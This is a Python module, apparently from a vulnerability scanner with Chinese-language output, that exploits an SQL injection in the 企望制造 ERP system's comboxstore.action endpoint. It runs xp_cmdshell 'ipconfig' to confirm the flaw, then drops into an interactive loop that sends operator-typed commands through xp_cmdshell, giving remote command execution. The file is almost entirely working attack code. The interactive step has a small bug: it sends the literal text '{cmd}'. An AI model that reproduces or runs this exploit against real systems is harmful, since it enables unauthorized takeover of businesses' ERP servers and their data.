# body="./images/lg_05_1.gif"
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class QIWANGZHIZAORce:
	def scan(self,baseurl):
		url=baseurl+"/mainFunctions/comboxstore.action"
		try:
			header = {
				"Host":baseurl.split("://")[-1],
				"User-Agent":self.headers,
				"Content-Type":"application/x-www-form-urlencoded"
			}
			data = "comboxsql=exec%20xp_cmdshell%20'ipconfig'"
			response = requests.post(url=url,headers=header,data=data,verify=self.ssl,proxies=self.proxy,timeout=15)
			if "IPv6" in response.text:
				OutPrintInfoSuc("企望制造ERP",f"存在企望制造ERP-RCE: {url}")
				if not self.batch:
					OutPrintInfo("企望制造ERP",f"Request Data: {data}")
				else:
					OutPutFile("qiwangzhizao_rce.txt",f"存在企望制造ERP-RCE: {url}")
				return True
			else:
				if not self.batch:
					OutPrintInfo("企望制造ERP","不存在企望制造ERP-RCE")
				return False
		except Exception:
			if not self.batch:
				OutPrintInfo("企望制造ERP", "目标请求出错")
				return False
	def scan2(self,baseurl,cmd):
		url=baseurl+"/mainFunctions/comboxstore.action"
		try:
			header = {
				"Host":baseurl.split("://")[-1],
				"User-Agent":self.headers,
				"Content-Type":"application/x-www-form-urlencoded"
			}
			data = "comboxsql=exec%20xp_cmdshell%20'{cmd}'"
			response = requests.post(url=url,headers=header,data=data,verify=self.ssl,proxies=self.proxy,timeout=15)
			OutPrintInfoSuc("企望制造ERP", f"响应:\n{response.text.strip()}")
		except Exception:
			OutPrintInfo("企望制造ERP", "目标请求出错")



	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(header=self.headers, proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("企望制造ERP", '开始执行企望制造ERP-RCE...')

		if self.scan(url):
			if not self.batch:
				choose = Prompt.ask("[b yellow]是否进行RCE利用([b bright_red]y/n[/b bright_red])")
				if choose == "y":
					while True:
						cmd = Prompt.ask("[b yellow]输入需要执行对命令")
						if cmd == "exit":
							break
						self.scan2(url,cmd)
		if not self.batch:
			OutPrintInfo("企望制造ERP", '企望制造ERP-RCE执行结束')